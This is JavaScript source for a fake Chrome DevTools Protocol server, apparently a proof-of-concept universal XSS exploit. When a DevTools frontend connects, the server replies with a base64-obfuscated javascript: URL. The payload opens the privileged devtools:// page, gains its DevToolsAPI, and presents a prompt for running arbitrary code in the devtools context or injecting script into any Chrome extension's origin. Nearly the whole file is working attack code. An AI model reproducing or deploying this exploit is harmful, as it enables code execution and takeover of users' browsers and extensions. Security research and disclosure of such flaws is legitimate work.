import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";

const WebSocket_port = 8080;
const HTTP_port = 9123;
const wss = new WebSocketServer({ port: WebSocket_port });

const serve = serveStatic("./");
createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);
console.log(
    `The server is accessible at http://localhost:${HTTP_port}\n--------`,
);
console.log(
    `The websocket is accessible at http://localhost:${WebSocket_port}\n--------`,
);

let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

wss.on("connection", function connection(wss_con) {
    wss_con.on("message", (msg) => {
        function payload1() {

            // alert(origin);

            //     window.w = w;
            // })
            const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
            window.opener.close();
            w.addEventListener("load", async () => {
                if (!w.DevToolsAPI) {
                    console.log("reloading");
                    w.opener = null;
                    w.location.reload();
                }
                await sleep(500);
                console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
                exploit(w);
            });

            window.w = w;

            
            function exploit(w) {

               
                function ui() {
                    function payload_swamp(w) {
                        w.alert("Hello world from " + w.origin);
                    }
                    document.open();
                    document.write(`
                        <p> Press q for evaluating code under extension id </p>
                        <p> Press m for evaluating under devtools context </p>
                        <p> Typing 'cancel' in any prompt will cancel the current operation. </p>
                    `)
                    onkeydown = function(ev) {
                        if (ev.key.toLowerCase() === "m") {
                            var l_canceled = false;
                            const id = setTimeout(function m() {
                                if (l_canceled) return;
                                (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                                if (!l_canceled) setTimeout(m, 0);
                                clearTimeout(id);
                            });
                            Object.defineProperty(window, 'cancel', {
                                get: function() {
                                    l_canceled = true;
                                }, configurable: true
                            })
                            return;
                        }
                        if (ev.key.toLowerCase() === 'q') {
                            let x = null;
                            while (!x) {
                                x = prompt('Extension id?');
                                if (x === "cancel") {
                                    return;
                                }
                            }
                            const URL_1 = `chrome-extension://${ x ?? 
alert("NOTREACHED")}/manifest.json`;
                            InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w)} //`);
                            const ifr = document.createElement("iframe");
                            ifr.src = URL_1;
                            document.body.appendChild(ifr);
                        }
                    }
                }
                w.eval(`(${ui.toString()})()`);
                window.close();
            }

            function sleep(ms) {
                return new Promise(resolve => {
                    setTimeout(resolve, ms);
                });
            }
        }

        let json_msg = JSON.parse(msg.toString());
        let { id, method, params } = json_msg;
        console.log(id + "> ", method, params);

        if (method === "Target.setDiscoverTargets") {
            wss_con.send(
                JSON.stringify({
                    method: "Network.requestWillBeSent",
                    params: {
                        request: {
                            url: `javascript: (function () {eval(atob("${btoa(`(${payload1.toString()})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                        },
                    },
                }),
            );
            // setTimeout(function() {
            //     wss_con.send(
            //         JSON.stringify({
            //             method: "Network.requestWillBeSent",
            //             params: {
            //                 request: {
            //                     url: `javascript: (function () {eval(atob("${btoa(`(${payload2.toString()})()`)}"))})()`,
            //                 },
            //             },
            //         }),
            //     );
            // }, 200);
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});
